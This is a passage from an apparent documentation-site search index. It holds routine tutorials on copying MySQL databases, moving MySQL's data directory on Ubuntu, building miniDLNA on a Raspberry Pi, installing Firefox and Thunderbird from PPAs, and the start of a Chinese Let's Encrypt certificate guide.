feed it as input to the mysql client. Use mysqldump --help to see what options are available. The easiest (although not the fastest) way to move a database between two machines is to run the following commands on the machine on which the database is located: mysqladmin -h '*other_hostname*' create *db_name* mysqldump *db_name* | mysql -h '*other_hostname*' *db_name* If you want to copy a database from a remote machine over a slow network, you can use these commands: mysqladmin create *db_name* mysqldump -h '*other_hostname*' --compress *db_name* | mysql *db_name* You can also store the dump in a file, transfer the file to the target machine, and then load the file into the database there. For example, you can dump a database to a compressed file on the source machine like this: mysqldump --quick *db_name* | gzip > *db_name*.gz Transfer the file containing the database contents to the target machine and run these commands there: mysqladmin create *db_name* gunzip < *db_name*.gz | mysql *db_name* You can also use mysqldump and mysqlimport to transfer the database. For large tables, this is much faster than simply using mysqldump . In the following commands, DUMPDIR represents the full path name of the directory you use to store the output from mysqldump . First, create the directory for the output files and dump the database: mkdir *DUMPDIR* mysqldump --tab=*DUMPDIR* *db_name* Then transfer the files in the DUMPDIR directory to some corresponding directory on the target machine and load the files into MySQL there: mysqladmin create *db_name* # create database cat *DUMPDIR*/*.sql | mysql *db_name* # create tables in database mysqlimport *db_name* *DUMPDIR*/*.txt # load data into tables Do not forget to copy the mysql database because that is where the grant tables are stored. You might have to run commands as the MySQL root user on the new machine until you have the mysql database in place. After you import the mysql database on the new machine, execute mysqladmin flush-privileges so that the server reloads the grant table information. Note You can copy the .frm , .MYI , and .MYD files for MyISAM tables between different architectures that support the same floating-point format. (MySQL takes care of any byte-swapping issues.) See Section 15.2, \u201cThe MyISAM Storage Engine\u201d . \u539f\u6587\u94fe\u63a5\uff1a https://dev.mysql.com/doc/refman/5.7/en/copying-databases.html","title":"2.11.13\u00a0Copying MySQL Databases to Another Machine"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/","text":"How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 | DigitalOcean DigitalOcean Homepage ### Introduction Databases grow over time, sometimes outgrowing the space on the file system. You can also run into I/O contention when they\u2019re located on the same partition as the rest of the operating system. RAID, network block storage, and other devices can offer redundancy and other desirable features. Whether you\u2019re adding more space, evaluating ways to optimize performance, or looking to take advantage of other storage features, this tutorial will guide you through relocating MySQL\u2019s data directory. Prerequisites To complete this guide, you will need: An Ubuntu 16.04 server with a non-root user with sudo privileges . You can learn more about how to set up a user with these privileges in our Initial Server Setup with Ubuntu 16.04 guide. A MySQL server . If you haven\u2019t already installed MySQL, the How To Install MySQL on Ubuntu 16.04 guide can help you. In this example, we\u2019re moving the data to a block storage device mounted at /mnt/volume-nyc1-01 . You can learn how to set one up in the How To Use Block Storage on DigitalOcean guide. No matter what underlying storage you use, this guide can help you move the data directory to a new location. Step 1 \u2014 Moving the MySQL Data Directory To prepare for moving MySQL\u2019s data directory, let\u2019s verify the current location by starting an interactive MySQL session using the administrative credentials. 1. mysql -u root -p When prompted, supply the MySQL root password. Then from the MySQL prompt, select the data directory: 1. select @@datadir; Output+-----------------+ | @@datadir | +-----------------+ | /var/lib/mysql/ | +-----------------+ 1 row in set (0.00 sec) This output confirms that MySQL is configured to use the default data directory, /var/lib/mysql/, so that\u2019s the directory we need to move. Once you\u2019ve confirmed this, type exit to leave the monitor. To ensure the integrity of the data, we\u2019ll shut down MySQL before we actually make changes to the data directory: 1. sudo systemctl stop mysql systemctl doesn\u2019t display the outcome of all service management commands, so if you want to be sure you\u2019ve succeeded, use the following command: 1. sudo systemctl status mysql You can be sure it\u2019s shut down if the final line of the output tells you the server is stopped: Output. . . Jul 18 11:24:20 ubuntu-512mb-nyc1-01 systemd[1]: Stopped MySQL Community Server. Now that the server is shut down, we\u2019ll copy the existing database directory to the new location with rsync . Using the -a flag preserves the permissions and other directory properties, while -v provides verbose output so you can follow the progress. Note: Be sure there is no trailing slash on the directory, which may be added if you use tab completion. When there\u2019s a trailing slash, rsync will dump the contents of the directory into the mount point instead of transferring it into a containing mysql directory: 1. sudo rsync -av /var/lib/mysql /mnt/volume-nyc1-01 Once the rsync is complete, rename the current folder with a .bak extension and keep it until we\u2019ve confirmed the move was successful. By re-naming it, we\u2019ll avoid confusion that could arise from files in both the new and the old location: 1. sudo mv /var/lib/mysql /var/lib/mysql.bak Now we\u2019re ready to turn our attention to configuration. Step 2 \u2014 Pointing to the New Data Location MySQL has several ways to override configuration values. By default, the datadir is set to /var/lib/mysql in the /etc/mysql/mysql.conf.d/mysqld.cnf file. Edit this file to reflect the new data directory: 1. sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf Find the line that begins with datadir= and change the path which follows to reflect the new location. In our case, the updated file looks like the output below: /etc/mysql/mysql.conf.d/mysqld.cnf . . . datadir=/mnt/volume-nyc1-01/mysql . . . This seems like the right time to bring up MySQL again, but there\u2019s one more thing to configure before we can do that successfully. Step 3 \u2014 Configuring AppArmor Access Control Rules We\u2019ll need to tell AppArmor to let MySQL write to the new directory by creating an alias between the default directory and the new location. To do this, edit the AppArmor alias file: 1. sudo nano /etc/apparmor.d/tunables/alias At the bottom of the file, add the following alias rule: . . . [label /etc/apparmor.d/tunables/alias] alias /var/lib/mysql/ -> /mnt/volume-nyc1-01/mysql/, . . . For the changes to take effect, restart AppArmor: 1. sudo systemctl restart apparmor Note: If you skipped the AppArmor configuration step, you would run into the following error message: OutputJob for mysql.service failed because the control process exited with error code. See \"systemctl status mysql.service\" and \"journalctl -xe\" for details. The output from both systemctl and journalctl concludes with: OutputJul 18 11:03:24 ubuntu-512mb-nyc1-01 systemd[1]: mysql.service: Main process exited, code=exited, status=1/FAILURE Since the messages don\u2019t make an explicit connection between AppArmor and the data directory, this error can take some time to figure out. Step 4 \u2014 Restarting MySQL The next step is to start MySQL, but if you do, you\u2019ll run into another error. This time, instead of an AppArmor issue, the error happens because the script mysql-systemd-start checks for the existence of either a directory, -d , or a symbolic link, -L , that matches two default paths. It fails if they\u2019re not found: /usr/share/mysql/mysql-systemd-start . . . if [ ! -d /var/lib/mysql ] && [ ! -L /var/lib/mysql ]; then echo \"MySQL data dir not found at /var/lib/mysql. Please create one.\" exit 1 fi if [ ! -d /var/lib/mysql/mysql ] && [ ! -L /var/lib/mysql/mysql ]; then echo \"MySQL system database not found. Please run mysql_install_db tool.\" exit 1 fi . . . Since we need these to start the server, we will create the minimal directory structure to pass the script\u2019s environment check. 1. sudo mkdir /var/lib/mysql/mysql -p Now we\u2019re ready to start MySQL. 1. sudo systemctl start mysql 2. sudo systemctl status mysql To make sure that the new data directory is indeed in use, start the MySQL monitor. 1. mysql -u root -p Look at the value for the data directory again: Output+----------------------------+ | @@datadir | +----------------------------+ | /mnt/volume-nyc1-01/mysql/ | +----------------------------+ 1 row in set (0.01 sec) Now that you\u2019ve restarted MySQL and confirmed that it\u2019s using the new location, take the opportunity to ensure that your database is fully functional. Once you\u2019ve verified the integrity of any existing data, you can remove the backup data directory: 1. sudo rm -Rf /var/lib/mysql.bak Restart MySQL one final time to be sure that it works as expected: 1. sudo systemctl restart mysql 2. sudo systemctl status mysql Conclusion In this tutorial, we\u2019ve moved MySQL\u2019s data directory to a new location and updated Ubuntu\u2019s AppArmor ACLs to accommodate the adjustment. Although we were using a Block Storage device, the instructions here should be suitable for redefining the location of the data directory regardless of the underlying technology. For more on managing MySQL\u2019s data directories, see these sections in the official MySQL documentation: The Mysql Data Directory Setting Up Multiple Data Directories \u539f\u6587\u94fe\u63a5\uff1a https://www.digitalocean.com/community/tutorials/how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-16-04","title":"How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-1604-digitalocean-digitalocean-homepage","text":"### Introduction Databases grow over time, sometimes outgrowing the space on the file system. You can also run into I/O contention when they\u2019re located on the same partition as the rest of the operating system. RAID, network block storage, and other devices can offer redundancy and other desirable features. Whether you\u2019re adding more space, evaluating ways to optimize performance, or looking to take advantage of other storage features, this tutorial will guide you through relocating MySQL\u2019s data directory.","title":"How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 | DigitalOcean DigitalOcean Homepage"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#prerequisites","text":"To complete this guide, you will need: An Ubuntu 16.04 server with a non-root user with sudo privileges . You can learn more about how to set up a user with these privileges in our Initial Server Setup with Ubuntu 16.04 guide. A MySQL server . If you haven\u2019t already installed MySQL, the How To Install MySQL on Ubuntu 16.04 guide can help you. In this example, we\u2019re moving the data to a block storage device mounted at /mnt/volume-nyc1-01 . You can learn how to set one up in the How To Use Block Storage on DigitalOcean guide. No matter what underlying storage you use, this guide can help you move the data directory to a new location.","title":"Prerequisites"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-1-moving-the-mysql-data-directory","text":"To prepare for moving MySQL\u2019s data directory, let\u2019s verify the current location by starting an interactive MySQL session using the administrative credentials. 1. mysql -u root -p When prompted, supply the MySQL root password. Then from the MySQL prompt, select the data directory: 1. select @@datadir; Output+-----------------+ | @@datadir | +-----------------+ | /var/lib/mysql/ | +-----------------+ 1 row in set (0.00 sec) This output confirms that MySQL is configured to use the default data directory, /var/lib/mysql/, so that\u2019s the directory we need to move. Once you\u2019ve confirmed this, type exit to leave the monitor. To ensure the integrity of the data, we\u2019ll shut down MySQL before we actually make changes to the data directory: 1. sudo systemctl stop mysql systemctl doesn\u2019t display the outcome of all service management commands, so if you want to be sure you\u2019ve succeeded, use the following command: 1. sudo systemctl status mysql You can be sure it\u2019s shut down if the final line of the output tells you the server is stopped: Output. . . Jul 18 11:24:20 ubuntu-512mb-nyc1-01 systemd[1]: Stopped MySQL Community Server. Now that the server is shut down, we\u2019ll copy the existing database directory to the new location with rsync . Using the -a flag preserves the permissions and other directory properties, while -v provides verbose output so you can follow the progress. Note: Be sure there is no trailing slash on the directory, which may be added if you use tab completion. When there\u2019s a trailing slash, rsync will dump the contents of the directory into the mount point instead of transferring it into a containing mysql directory: 1. sudo rsync -av /var/lib/mysql /mnt/volume-nyc1-01 Once the rsync is complete, rename the current folder with a .bak extension and keep it until we\u2019ve confirmed the move was successful. By re-naming it, we\u2019ll avoid confusion that could arise from files in both the new and the old location: 1. sudo mv /var/lib/mysql /var/lib/mysql.bak Now we\u2019re ready to turn our attention to configuration.","title":"Step 1 \u2014 Moving the MySQL Data Directory"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-2-pointing-to-the-new-data-location","text":"MySQL has several ways to override configuration values. By default, the datadir is set to /var/lib/mysql in the /etc/mysql/mysql.conf.d/mysqld.cnf file. Edit this file to reflect the new data directory: 1. sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf Find the line that begins with datadir= and change the path which follows to reflect the new location. In our case, the updated file looks like the output below: /etc/mysql/mysql.conf.d/mysqld.cnf . . . datadir=/mnt/volume-nyc1-01/mysql . . . This seems like the right time to bring up MySQL again, but there\u2019s one more thing to configure before we can do that successfully.","title":"Step 2 \u2014 Pointing to the New Data Location"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-3-configuring-apparmor-access-control-rules","text":"We\u2019ll need to tell AppArmor to let MySQL write to the new directory by creating an alias between the default directory and the new location. To do this, edit the AppArmor alias file: 1. sudo nano /etc/apparmor.d/tunables/alias At the bottom of the file, add the following alias rule: . . . [label /etc/apparmor.d/tunables/alias] alias /var/lib/mysql/ -> /mnt/volume-nyc1-01/mysql/, . . . For the changes to take effect, restart AppArmor: 1. sudo systemctl restart apparmor Note: If you skipped the AppArmor configuration step, you would run into the following error message: OutputJob for mysql.service failed because the control process exited with error code. See \"systemctl status mysql.service\" and \"journalctl -xe\" for details. The output from both systemctl and journalctl concludes with: OutputJul 18 11:03:24 ubuntu-512mb-nyc1-01 systemd[1]: mysql.service: Main process exited, code=exited, status=1/FAILURE Since the messages don\u2019t make an explicit connection between AppArmor and the data directory, this error can take some time to figure out.","title":"Step 3 \u2014 Configuring AppArmor Access Control Rules"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-4-restarting-mysql","text":"The next step is to start MySQL, but if you do, you\u2019ll run into another error. This time, instead of an AppArmor issue, the error happens because the script mysql-systemd-start checks for the existence of either a directory, -d , or a symbolic link, -L , that matches two default paths. It fails if they\u2019re not found: /usr/share/mysql/mysql-systemd-start . . . if [ ! -d /var/lib/mysql ] && [ ! -L /var/lib/mysql ]; then echo \"MySQL data dir not found at /var/lib/mysql. Please create one.\" exit 1 fi if [ ! -d /var/lib/mysql/mysql ] && [ ! -L /var/lib/mysql/mysql ]; then echo \"MySQL system database not found. Please run mysql_install_db tool.\" exit 1 fi . . . Since we need these to start the server, we will create the minimal directory structure to pass the script\u2019s environment check. 1. sudo mkdir /var/lib/mysql/mysql -p Now we\u2019re ready to start MySQL. 1. sudo systemctl start mysql 2. sudo systemctl status mysql To make sure that the new data directory is indeed in use, start the MySQL monitor. 1. mysql -u root -p Look at the value for the data directory again: Output+----------------------------+ | @@datadir | +----------------------------+ | /mnt/volume-nyc1-01/mysql/ | +----------------------------+ 1 row in set (0.01 sec) Now that you\u2019ve restarted MySQL and confirmed that it\u2019s using the new location, take the opportunity to ensure that your database is fully functional. Once you\u2019ve verified the integrity of any existing data, you can remove the backup data directory: 1. sudo rm -Rf /var/lib/mysql.bak Restart MySQL one final time to be sure that it works as expected: 1. sudo systemctl restart mysql 2. sudo systemctl status mysql","title":"Step 4 \u2014 Restarting MySQL"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#conclusion","text":"In this tutorial, we\u2019ve moved MySQL\u2019s data directory to a new location and updated Ubuntu\u2019s AppArmor ACLs to accommodate the adjustment. Although we were using a Block Storage device, the instructions here should be suitable for redefining the location of the data directory regardless of the underlying technology. For more on managing MySQL\u2019s data directories, see these sections in the official MySQL documentation: The Mysql Data Directory Setting Up Multiple Data Directories \u539f\u6587\u94fe\u63a5\uff1a https://www.digitalocean.com/community/tutorials/how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-16-04","title":"Conclusion"},{"location":"RPI/Install%20Latest%20ReadyMedia%20miniDLNA%20Raspberry%20Pi/","text":"DLNA servers allow you to stream your media library on your HTPC server to any DLNA enabled client. DLNA enabled clients include Bluray players, XBOX 360, XBOX One, PS3, PS4 and some TVs. There are other DLNA servers out there for the Raspberry Pi. I was looking at MediaTomb but it consumes several hundred megabytes of RAM when it is in use. This it not ideal on the low spec Pi running Raspbian. I had trouble with miniDLNA 1.0.24 not displaying avi (Divx, XviD) files in its folder database, this bug has been patched and fixed so that avi files \u2013 at least the ones I tested \u2013 were accessible by my DLNA clients. I will assume you have already mounted a USB hard drive for this guide \u2013 here is my Properly Mount USB Storage on Raspberry Guide in case you do need to mount. You will be compiling miniDLNA for Raspbian from source, it only takes a few minutes. If you are trying to figure out which hardware would work best for you, consider reading the Pi benchmarks . Update \u2013 Now installs the latest miniDLNA The latest version of ReadyMedia miniDLNA in the Raspbian repos is ancient so we are going to compile miniDLNA (now ReadyMedia) from source on Raspbian. This should fix avi problems you may have had in the past like them not showing up in the library. Remove your old miniDLNA version sudo apt-get purge minidlna -y sudo apt-get remove minidlna sudo apt-get autoremove -y Make sure you have a source repository, default Raspbian does not include this, change wheezy to jessie if you know you are on jessie echo \"deb-src http://archive.raspbian.org/raspbian wheezy main contrib non-free\" | sudo tee -a /etc/apt/sources.list Update repositories so it will detect your new source repo sudo apt-get update Grab dependencies for building it from source sudo apt-get build-dep minidlna -y If you get any errors you can install the dependencies manually sudo apt-get install autopoint debhelper dh-autoreconf gcc libavutil-dev libavcodec-dev libavformat-dev libjpeg-dev libsqlite3-dev libexif-dev libid3tag0-dev libogg-dev libvorbis-dev libflac-dev -y Download the latest miniDLNA source wget http://sourceforge.net/projects/minidlna/files/latest/download?source=files -O minidlna.tar.gz SourceForge has some stability issues so here is a Dropbox mirror for 1.1.4 in case it is down wget https://www.dropbox.com/s/hhv7ee057plec7a/minidlna-1.1.4.tar.gz Unpack miniDLNA tar -xvf minidlna*.tar.gz Enter the miniDLNA directory cd minidlna* Configure, make and install miniDLNA, it will take 5 minutes. ./configure && sudo make && sudo make install Copy the default configuration file sudo cp minidlna.conf /etc/ Copy the startup daemon script to autostart ReadyMedia miniDLNA on boot sudo cp linux/minidlna.init.d.script /etc/init.d/minidlna Make the startup script executable sudo chmod +x /etc/init.d/minidlna Update rc to use the miniDLNA defaults sudo update-rc.d minidlna defaults Edit the configuration sudo nano /etc/minidlna.conf Edit the settings below to point to your media folders. This version of minidlna will give you multiple folders under Video. Before movies and TV would have been under separate categories, now movies and TV will both be under the category video. It will also show the folder structure of them instead of showing just the video files. Avi files will also show up and be streamable. inotify uses resources because it autoupdates your library, if you don't use inotify you will have to manually restart and reload the miniDLNA service The friendly name is how your miniDLNA server will show up to its streaming clients media_dir=V,/mnt/usbstorage/Movies media_dir=V,/mnt/usbstorage/TV media_dir=A,/mnt/usbstorage/Music media_dir=P,/mnt/usbstorage/Pictures # Names the DLNA server friendly_name=RasPi Media Server # Tells the DLNA to update the library when there are changes inotify=yes Ctrl+X, Y and Enter to save and exit Start the minidlna service sudo service minidlna start Now make sure miniDLNA starts on boot It will run on port 8200 so you can check how many media files it has indexed there sudo reboot Your Raspberry Pi DLNA server will now be accessible to stream media to your clients: PCs, XBOX, PS3, Phones, TVs and more. This will form part of my Ultimate Raspberry Pi Media Server guide, to make sure you don't miss it sign up for my mailing list to find out when it drops.","title":"Install Latest ReadyMedia miniDLNA Raspberry Pi"},{"location":"RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/","text":"Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete] This is a way to get the latest version of Firefox and Thunderbird on your Raspberry Pi. THIS ONLY WORKS ON A RASPBERRY PI 2 OR 3 OR 3B+! EDIT: This doesn't work right now, I'm trying to find out why. EDIT: I found out why it doesn't work. There is an unfixed bug in recent versions of Firefox for armhf, to use this you will have to switch to a 64-bit kernel by using something like this . Install dirmngr: Code: Select all sudo apt install dirmngr Add the repository to your sources: Code: Select all echo \"deb http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox.list echo \"deb-src http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox-source.list echo \"deb http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird.list echo \"deb-src http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird-source.list Install Firefox and Thunderbird: Code: Select all sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A6DCF7707EBC211F sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 9BDB3D89CE49EC21 sudo apt update && sudo apt install firefox thunderbird -y Firefox and Thunderbird should be installed! \u539f\u6587\u94fe\u63a5\uff1a https://forums.raspberrypi.com/viewtopic.php?t=150438","title":"Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete]"},{"location":"RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/#latest-version-of-firefox-and-thunderbird-on-a-raspberry-pi-obsolete","text":"This is a way to get the latest version of Firefox and Thunderbird on your Raspberry Pi. THIS ONLY WORKS ON A RASPBERRY PI 2 OR 3 OR 3B+! EDIT: This doesn't work right now, I'm trying to find out why. EDIT: I found out why it doesn't work. There is an unfixed bug in recent versions of Firefox for armhf, to use this you will have to switch to a 64-bit kernel by using something like this . Install dirmngr: Code: Select all sudo apt install dirmngr Add the repository to your sources: Code: Select all echo \"deb http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox.list echo \"deb-src http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox-source.list echo \"deb http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird.list echo \"deb-src http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird-source.list Install Firefox and Thunderbird: Code: Select all sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A6DCF7707EBC211F sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 9BDB3D89CE49EC21 sudo apt update && sudo apt install firefox thunderbird -y Firefox and Thunderbird should be installed! \u539f\u6587\u94fe\u63a5\uff1a https://forums.raspberrypi.com/viewtopic.php?t=150438","title":"Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete]"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/","text":"Let's Encrypt\uff0c\u514d\u8d39\u597d\u7528\u7684 HTTPS \u8bc1\u4e66 ============================ \u5f88\u65e9\u4e4b\u524d\u6211\u5c31\u5728\u5173\u6ce8 Let's Encrypt \u8fd9\u4e2a\u514d\u8d39\u3001\u81ea\u52a8\u5316\u3001\u5f00\u653e\u7684\u8bc1\u4e66\u7b7e\u53d1\u670d\u52a1\u3002\u5b83\u7531 ISRG\uff08Internet Security Research Group\uff0c\u4e92\u8054\u7f51\u5b89\u5168\u7814\u7a76\u5c0f\u7ec4\uff09\u63d0\u4f9b\u670d\u52a1\uff0c\u800c ISRG \u662f\u6765\u81ea\u4e8e\u7f8e\u56fd\u52a0\u5229\u798f\u5c3c\u4e9a\u5dde\u7684\u4e00\u4e2a\u516c\u76ca\u7ec4\u7ec7\u3002Let's Encrypt \u5f97\u5230\u4e86 Mozilla\u3001Cisco\u3001Akamai\u3001Electronic Frontier Foundation \u548c Chrome \u7b49\u4f17\u591a\u516c\u53f8\u548c\u673a\u6784\u7684\u652f\u6301\uff0c\u53d1\u5c55\u5341\u5206\u8fc5\u731b\u3002 \u7533\u8bf7 Let's Encrypt \u8bc1\u4e66\u4e0d\u4f46\u514d\u8d39\uff0c\u8fd8\u975e\u5e38\u7b80\u5355\uff0c\u867d\u7136\u6bcf\u6b21\u53ea\u6709 90 \u5929\u7684\u6709\u6548\u671f\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u5b9a\u671f\u66f4\u65b0\uff0c\u914d\u597d\u4e4b\u540e\u4e00\u52b3\u6c38\u9038\u3002\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u89c2\u671b\uff0c\u6211\u4e5f\u6b63\u5f0f\u542f\u7528 Let's Encrypt \u8bc1\u4e66\u4e86\uff0c\u672c\u6587\u8bb0\u5f55\u672c\u7ad9\u7533\u8bf7\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u3002 \u6211\u6ca1\u6709\u4f7f\u7528 Let's Encrypt \u5b98\u7f51\u63d0\u4f9b\u7684\u5de5\u5177\u6765\u7533\u8bf7\u8bc1\u4e66\uff0c\u800c\u662f\u7528\u4e86 acme-tiny \u8fd9\u4e2a\u66f4\u4e3a\u5c0f\u5de7\u7684\u5f00\u6e90\u5de5\u5177\u3002\u4ee5\u4e0b\u5185\u5bb9\u57fa\u672c\u6309\u7167 acme-tiny \u7684\u8bf4\u660e\u6587\u6863\u5199\u7684\uff0c\u7701\u7565\u4e86\u4e00\u4e9b\u6211\u4e0d\u9700\u8981\u7684\u6b65\u9aa4\u3002 ACME \u5168\u79f0\u662f Automated Certificate Management Environment\uff0c\u76f4\u8bd1\u8fc7\u6765\u662f\u81ea\u52a8\u5316\u8bc1\u4e66\u7ba1\u7406\u73af\u5883\u7684\u610f\u601d\uff0cLet's Encrypt \u7684\u8bc1\u4e66\u7b7e\u53d1\u8fc7\u7a0b\u4f7f\u7528\u7684\u5c31\u662f ACME \u534f\u8bae\u3002\u6709\u5173 ACME \u534f\u8bae\u7684\u66f4\u591a\u8d44\u6599\u53ef\u4ee5\u5728 \u8fd9\u4e2a\u4ed3\u5e93 \u627e\u5230\u3002 \u521b\u5efa\u5e10\u53f7 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55\uff0c\u4f8b\u5982 ssl \uff0c\u7528\u6765\u5b58\u653e\u5404\u79cd\u4e34\u65f6\u6587\u4ef6\u548c\u6700\u540e\u7684\u8bc1\u4e66\u6587\u4ef6\u3002\u8fdb\u5165\u8fd9\u4e2a\u76ee\u5f55\uff0c\u521b\u5efa\u4e00\u4e2a RSA \u79c1\u94a5\u7528\u4e8e Let's Encrypt \u8bc6\u522b\u4f60\u7684\u8eab\u4efd\uff1a openssl genrsa 4096 > account.key \u521b\u5efa CSR \u6587\u4ef6 \u63a5\u7740\u5c31\u53ef\u4ee5\u751f\u6210 CSR\uff08Certificate Signing Request\uff0c\u8bc1\u4e66\u7b7e\u540d\u8bf7\u6c42\uff09\u6587\u4ef6\u4e86\u3002\u5728\u8fd9\u4e4b\u524d\uff0c\u8fd8\u9700\u8981\u521b\u5efa\u57df\u540d\u79c1\u94a5\uff08\u4e00\u5b9a\u4e0d\u8981\u4f7f\u7528\u4e0a\u9762\u7684\u8d26\u6237\u79c1\u94a5\uff09\uff0c\u6839\u636e\u8bc1\u4e66\u4e0d\u540c\u7c7b\u578b\uff0c\u57df\u540d\u79c1\u94a5\u4e5f\u53ef\u4ee5\u9009\u62e9 RSA \u548c ECC \u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u3002\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u4e8c\u9009\u4e00\u3002 1\uff09\u521b\u5efa RSA \u79c1\u94a5\uff08\u517c\u5bb9\u6027\u597d\uff09\uff1a openssl genrsa 4096 > domain.key 2\uff09\u521b\u5efa ECC \u79c1\u94a5\uff08\u90e8\u5206\u8001\u65e7\u64cd\u4f5c\u7cfb\u7edf\u3001\u6d4f\u89c8\u5668\u4e0d\u652f\u6301\u3002\u4f18\u70b9\u662f\u8bc1\u4e66\u4f53\u79ef\u5c0f\uff09\uff1a #secp256r1 openssl ecparam -genkey -name secp256r1 | openssl ec -out domain.key #secp384r1 openssl ecparam -genkey -name secp384r1 | openssl ec -out domain.key \u6709\u5173 ECC \u8bc1\u4e66\u7684\u66f4\u591a\u4ecb\u7ecd\uff0c\u8bf7 \u70b9\u51fb\u8fd9\u91cc \u3002 \u6709\u4e86\u79c1\u94a5\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u751f\u6210 CSR \u6587\u4ef6\u4e86\u3002\u5728 CSR \u4e2d\u63a8\u8350\u81f3\u5c11\u628a\u57df\u540d\u5e26 www \u548c\u4e0d\u5e26 www \u7684\u4e24\u79cd\u60c5\u51b5\u90fd\u52a0\u8fdb\u53bb\uff0c\u5176\u5b83\u5b50\u57df\u53ef\u4ee5\u6839\u636e\u9700\u8981\u6dfb\u52a0\uff08\u76ee\u524d\u4e00\u5f20\u8bc1\u4e66\u6700\u591a\u53ef\u4ee5\u5305\u542b 100 \u4e2a\u57df\u540d\uff09\uff1a openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config <(cat /etc/ssl/openssl.cnf <(printf \"[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com\")) > domain.csr \u6267\u884c\u8fd9\u4e00\u6b65\u65f6\uff0c\u5982\u679c\u63d0\u793a\u627e\u4e0d\u5230 /etc/ssl/openssl.cnf \u6587\u4ef6\uff0c\u8bf7\u770b\u770b /usr/local/openssl/ssl/openssl.cnf \u662f\u5426\u5b58\u5728\u3002\u5982\u679c\u8fd8\u662f\u4e0d\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4ea4\u4e92\u65b9\u5f0f\u521b\u5efa CSR\uff08\u9700\u8981\u6ce8\u610f Common Name \u5fc5\u987b\u4e3a\u4f60\u7684\u57df\u540d\uff09\uff1a openssl req -new -sha256 -key domain.key -out domain.csr \u914d\u7f6e\u9a8c\u8bc1\u670d\u52a1 \u6211\u4eec\u77e5\u9053\uff0cCA \u5728\u7b7e\u53d1 DV\uff08Domain Validation\uff09\u8bc1\u4e66\u65f6\uff0c\u9700\u8981\u9a8c\u8bc1\u57df\u540d\u6240\u6709\u6743\u3002\u4f20\u7edf CA \u7684\u9a8c\u8bc1\u65b9\u5f0f\u4e00\u822c\u662f\u5f80 admin@yoursite.com \u53d1\u9a8c\u8bc1\u90ae\u4ef6\uff0c\u800c Let's Encrypt \u662f\u5728\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u751f\u6210\u4e00\u4e2a\u968f\u673a\u9a8c\u8bc1\u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u521b\u5efa CSR \u65f6\u6307\u5b9a\u7684\u57df\u540d\u8bbf\u95ee\uff0c\u5982\u679c\u53ef\u4ee5\u8bbf\u95ee\u5219\u8868\u660e\u4f60\u5bf9\u8fd9\u4e2a\u57df\u540d\u6709\u63a7\u5236\u6743\u3002 